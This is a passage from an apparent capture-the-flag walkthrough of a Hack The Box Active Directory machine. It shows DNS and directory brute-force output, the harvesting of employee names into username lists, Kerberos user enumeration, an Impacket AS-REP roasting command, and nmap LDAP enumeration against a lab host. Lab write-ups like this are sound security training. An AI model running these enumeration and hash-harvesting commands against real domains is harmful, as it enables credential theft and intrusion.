</span></span><span style="display:flex;"><span>research<span style="color:#f92672">.</span>search<span style="color:#f92672">.</span>htb<span style="color:#f92672">.</span>	<span style="color:#ae81ff">3600</span>	<span style="color:#66d9ef">IN</span>	A	<span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">129</span><span style="color:#f92672">.</span><span style="color:#ae81ff">247</span><span style="color:#f92672">.</span><span style="color:#ae81ff">185</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>;; <span style="color:#66d9ef">Query</span> <span style="color:#e6db74">time</span>: <span style="color:#ae81ff">260</span> msec
</span></span><span style="display:flex;"><span>;; <span style="color:#e6db74">SERVER</span>: <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">129</span><span style="color:#f92672">.</span><span style="color:#ae81ff">247</span><span style="color:#f92672">.</span><span style="color:#ae81ff">185</span><span style="color:#75715e">#53(10.129.247.185) (TCP)</span>
</span></span><span style="display:flex;"><span>;; <span style="color:#e6db74">WHEN</span>: <span style="color:#66d9ef">Sat</span> <span style="color:#66d9ef">Dec</span> <span style="color:#ae81ff">18</span> <span style="color:#ae81ff">23</span>:<span style="color:#ae81ff">24</span>:<span style="color:#ae81ff">25</span> <span style="color:#66d9ef">EST</span> <span style="color:#ae81ff">2021</span>
</span></span><span style="display:flex;"><span>;; <span style="color:#66d9ef">MSG</span> <span style="color:#66d9ef">SIZE</span>  <span style="color:#e6db74">rcvd</span>: <span style="color:#ae81ff">169</span>
</span></span></code></pre></div><p>The output is clean. We see two new subdomains; Adding both to our kail’s host files.
<strong>Useful info</strong> =&gt; <code>research.search.htb</code> and  <code>hostmaster.search.htb</code></p>
<p>Moving on to port 80, it’s running a webserver. We are not diving super deep into the website. From the home page, we do see some images. Mainly they have mentioned the team—names of all the employees working in the corporate.</p>
<h3 id="http">HTTP</h3>
<p>Here are the list of usernames =&gt; <a href="http://search.htb/index.html#team-section">team</a></p>
<ol>
<li>Keely Lyons</li>
<li>Dax Santiago</li>
<li>Sierra Frye</li>
<li>Kyla Stewart</li>
<li>Kaiara Spencer</li>
<li>Dave Simpson</li>
<li>Ben Thompson</li>
<li>Chris Stewart</li>
</ol>
<p>After adding the users to our list, we will brute force any hidden directory. We are using a well-known tool, <code>feroxbuster.</code></p>
<h4 id="directory-brute-force">Directory Brute Force</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">2</span>l       <span style="color:#ae81ff">10</span>w      <span style="color:#ae81ff">145</span>c <span style="color:#e6db74">http</span>:<span style="color:#e6db74">//se</span>arch<span style="color:#f92672">.</span>htb<span style="color:#f92672">/</span>css
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">2</span>l       <span style="color:#ae81ff">10</span>w      <span style="color:#ae81ff">148</span>c <span style="color:#e6db74">http</span>:<span style="color:#e6db74">//se</span>arch<span style="color:#f92672">.</span>htb<span style="color:#f92672">/</span>images
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">2</span>l       <span style="color:#ae81ff">10</span>w      <span style="color:#ae81ff">144</span>c <span style="color:#e6db74">http</span>:<span style="color:#e6db74">//se</span>arch<span style="color:#f92672">.</span>htb<span style="color:#f92672">/</span>js
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">2</span>l       <span style="color:#ae81ff">10</span>w      <span style="color:#ae81ff">147</span>c <span style="color:#e6db74">http</span>:<span style="color:#e6db74">//se</span>arch<span style="color:#f92672">.</span>htb<span style="color:#f92672">/</span>fonts
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">403</span>       <span style="color:#ae81ff">29</span>l       <span style="color:#ae81ff">92</span>w     <span style="color:#ae81ff">1233</span>c <span style="color:#e6db74">http</span>:<span style="color:#e6db74">//se</span>arch<span style="color:#f92672">.</span>htb<span style="color:#f92672">/</span>staff
</span></span></code></pre></div><p>We do see there is a page called <code>stuff</code>, but its <strong>403</strong>.</p>
<p>Now we can try to enumerate usernames, and there is a possibility that we can get a hash of users due to <code>KERBEROS PRE AUTH.</code></p>
<h3 id="kerberos">Kerberos</h3>
<p>First, we have to convert all these usernames to AD form. We can use many tools; I have used this small Github Repo. Captain-Noob <a href="%5Bhttps://github.com/captain-noob/username-wordlist-generator.git%5D(https://github.com/captain-noob/username-wordlist-generator.git)">username-wordlist-generator</a> has made this Repo. With this tool, we are converting the username to AD form. The usernames look like this, all names have 15 username possibility.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#e6db74">"Keely Lyons"</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">Keely</span><span style="color:#f92672">-</span><span style="color:#66d9ef">Lyons</span>, <span style="color:#66d9ef">Keely_Lyons</span>, <span style="color:#66d9ef">Keely</span><span style="color:#f92672">.</span>Lyon, <span style="color:#66d9ef">Keely</span>, <span style="color:#66d9ef">Lyons</span>, <span style="color:#66d9ef">KeelyLyons</span>, <span style="color:#66d9ef">KLyons</span>, <span style="color:#66d9ef">KeelyL</span>, K<span style="color:#f92672">-</span><span style="color:#66d9ef">Lyons</span>, <span style="color:#66d9ef">K_Lyons</span>, K<span style="color:#f92672">.</span>Lyons, <span style="color:#66d9ef">Keely</span><span style="color:#f92672">-</span>L, <span style="color:#66d9ef">Keely_L</span>, <span style="color:#66d9ef">Keely</span><span style="color:#f92672">.</span>L, <span style="color:#66d9ef">KL</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[...</span><span style="color:#66d9ef">SNIP</span><span style="color:#f92672">...]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">"Chris Stewart"</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">Chris</span><span style="color:#f92672">-</span><span style="color:#66d9ef">Stewart</span>, <span style="color:#66d9ef">Chris_Stewart</span>, <span style="color:#66d9ef">Chris</span><span style="color:#f92672">.</span>Stewart, <span style="color:#66d9ef">Chris</span> <span style="color:#66d9ef">Stewart</span>, <span style="color:#66d9ef">ChrisStewart</span>, <span style="color:#66d9ef">CStewart</span>, <span style="color:#66d9ef">ChrisS</span>, C<span style="color:#f92672">-</span><span style="color:#66d9ef">Stewart</span>, <span style="color:#66d9ef">C_Stewart</span>, C<span style="color:#f92672">.</span>Stewart, <span style="color:#66d9ef">Chris</span><span style="color:#f92672">-</span>S, <span style="color:#66d9ef">Chris_S</span>, <span style="color:#66d9ef">Chris</span><span style="color:#f92672">.</span>S, <span style="color:#66d9ef">CS</span>
</span></span></code></pre></div><p>Now to enumerate which username is correct, we are going to use an auxiliary module of Metasploit. <strong><code>kerberos_enumusers</code></strong> <code>use auxiliary/gather/kerberos_enumusers</code>
After running this module we are going to make a list of valid usernames.
Final Username Output =&gt;</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#f92672">[+]</span> <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">129</span><span style="color:#f92672">.</span><span style="color:#ae81ff">247</span><span style="color:#f92672">.</span><span style="color:#ae81ff">185</span>:<span style="color:#ae81ff">88</span> <span style="color:#f92672">-</span> <span style="color:#e6db74">User</span>: <span style="color:#e6db74">"keely.lyons"</span> is present
</span></span><span style="display:flex;"><span><span style="color:#f92672">[+]</span> <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">129</span><span style="color:#f92672">.</span><span style="color:#ae81ff">247</span><span style="color:#f92672">.</span><span style="color:#ae81ff">185</span>:<span style="color:#ae81ff">88</span> <span style="color:#f92672">-</span> <span style="color:#e6db74">User</span>: <span style="color:#e6db74">"dax.santiago"</span> is present
</span></span><span style="display:flex;"><span><span style="color:#f92672">[+]</span> <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">129</span><span style="color:#f92672">.</span><span style="color:#ae81ff">247</span><span style="color:#f92672">.</span><span style="color:#ae81ff">185</span>:<span style="color:#ae81ff">88</span> <span style="color:#f92672">-</span> <span style="color:#e6db74">User</span>: <span style="color:#e6db74">"sierra.frye"</span> is present
</span></span></code></pre></div><p>So final user are =&gt;</p>
<ol>
<li>keely.lyons</li>
<li>dax.santiago</li>
<li>sierra.frye</li>
</ol>
<p>Now we can use Impacket’s GetNPUsers tool. We have to give the list of usernames and the domain to enumerate.</p>
<h4 id="kerberos-pre-auth">Kerberos Pre Auth</h4>
<p>And we get zero hashes. This could be a dead end. But we have a last options, password spray and LDAP.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#75715e"># impacket-GetNPUsers search.htb/ -dc-ip 10.129.247.185 -usersfile usernames.txt -format john -outputfile hashes.txt</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Impacket</span> v0<span style="color:#f92672">.</span><span style="color:#ae81ff">9</span><span style="color:#f92672">.</span><span style="color:#ae81ff">24</span> <span style="color:#f92672">-</span> <span style="color:#66d9ef">Copyright</span> <span style="color:#ae81ff">2021</span> <span style="color:#66d9ef">SecureAuth</span> <span style="color:#66d9ef">Corporation</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[-]</span> <span style="color:#66d9ef">User</span> keely<span style="color:#f92672">.</span>lyons doesn<span style="color:#e6db74">'t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] User dax.santiago doesn'</span>t have <span style="color:#66d9ef">UF_DONT_REQUIRE_PREAUTH</span> set
</span></span><span style="display:flex;"><span><span style="color:#f92672">[-]</span> <span style="color:#66d9ef">User</span> sierra<span style="color:#f92672">.</span>frye doesn<span style="color:#e6db74">'t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] User hope.sharp doesn'</span>t have <span style="color:#66d9ef">UF_DONT_REQUIRE_PREAUTH</span> set
</span></span></code></pre></div><p>Going to LDAP, we can use Nmap’s scripts to enumerate. We could even use <code>ldapsearch</code>, but Nmap works fine.</p>
<h3 id="ldap">LDAP</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#75715e"># nmap -n -sV --script "ldap* and not brute" -p 389 search.htb </span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">PORT</span>    <span style="color:#66d9ef">STATE</span> <span style="color:#66d9ef">SERVICE</span> <span style="color:#66d9ef">VERSION</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">389</span><span style="color:#f92672">/</span>tcp open  ldap    <span style="color:#66d9ef">Microsoft</span> <span style="color:#66d9ef">Windows</span> <span style="color:#66d9ef">Active</span> <span style="color:#66d9ef">Directory</span> <span style="color:#66d9ef">LDAP</span> (<span style="color:#e6db74">Domain</span>: search<span style="color:#f92672">.</span>htb, <span style="color:#e6db74">Site</span>: <span style="color:#66d9ef">Default</span><span style="color:#f92672">-</span><span style="color:#66d9ef">First</span><span style="color:#f92672">-</span><span style="color:#66d9ef">Site</span><span style="color:#f92672">-</span><span style="color:#66d9ef">Name</span>)
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> ldap<span style="color:#f92672">-</span><span style="color:#e6db74">rootdse</span>: 
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">LDAP</span> <span style="color:#66d9ef">Results</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>   <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">ROOT</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">domainFunctionality</span>: <span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">forestFunctionality</span>: <span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">domainControllerFunctionality</span>: <span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">rootDomainNamingContext</span>: <span style="color:#66d9ef">DC</span><span style="color:#f92672">=</span>search,<span style="color:#66d9ef">DC</span><span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">ldapServiceName</span>: search<span style="color:#f92672">.</span>htb<span style="color:#e6db74">:research</span>$@<span style="color:#66d9ef">SEARCH</span><span style="color:#f92672">.</span>HTB
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">isGlobalCatalogReady</span>: <span style="color:#66d9ef">TRUE</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedSASLMechanisms</span>: <span style="color:#66d9ef">GSSAPI</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedSASLMechanisms</span>: <span style="color:#66d9ef">GSS</span><span style="color:#f92672">-</span><span style="color:#66d9ef">SPNEGO</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedSASLMechanisms</span>: <span style="color:#66d9ef">EXTERNAL</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedSASLMechanisms</span>: <span style="color:#66d9ef">DIGEST</span><span style="color:#f92672">-</span><span style="color:#66d9ef">MD5</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedLDAPVersion</span>: <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedLDAPVersion</span>: <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedLDAPPolicies</span>: <span style="color:#66d9ef">MaxPoolThreads</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedLDAPPolicies</span>: <span style="color:#66d9ef">MaxPercentDirSyncRequests</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedLDAPPolicies</span>: <span style="color:#66d9ef">MaxDatagramRecv</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedLDAPPolicies</span>: <span style="color:#66d9ef">MaxReceiveBuffer</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedLDAPPolicies</span>: <span style="color:#66d9ef">InitRecvTimeout</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedLDAPPolicies</span>: <span style="color:#66d9ef">MaxConnections</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedLDAPPolicies</span>: <span style="color:#66d9ef">MaxConnIdleTime</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedLDAPPolicies</span>: <span style="color:#66d9ef">MaxPageSize</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedLDAPPolicies</span>: <span style="color:#66d9ef">MaxBatchReturnMessages</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedLDAPPolicies</span>: <span style="color:#66d9ef">MaxQueryDuration</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedLDAPPolicies</span>: <span style="color:#66d9ef">MaxDirSyncDuration</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedLDAPPolicies</span>: <span style="color:#66d9ef">MaxTempTableSize</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedLDAPPolicies</span>: <span style="color:#66d9ef">MaxResultSetSize</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedLDAPPolicies</span>: <span style="color:#66d9ef">MinResultSets</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedLDAPPolicies</span>: <span style="color:#66d9ef">MaxResultSetsPerConn</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedLDAPPolicies</span>: <span style="color:#66d9ef">MaxNotificationPerConn</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedLDAPPolicies</span>: <span style="color:#66d9ef">MaxValRange</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedLDAPPolicies</span>: <span style="color:#66d9ef">MaxValRangeTransitive</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedLDAPPolicies</span>: <span style="color:#66d9ef">ThreadMemoryLimit</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedLDAPPolicies</span>: <span style="color:#66d9ef">SystemMemoryLimitPercent</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">319</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">801</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">473</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">528</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">417</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">619</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">841</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">529</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">805</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">521</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">970</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1338</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">474</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1339</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1340</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1413</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">16</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113730</span><span style="color:#f92672">.</span><span style="color:#ae81ff">3</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">9</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">16</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113730</span><span style="color:#f92672">.</span><span style="color:#ae81ff">3</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1504</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1852</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">802</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1907</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>       <span style="color:#e6db74">supportedControl</span>: <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">840</span><span style="color:#f92672">.</span><span style="color:#ae81ff">113556</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1948</span>
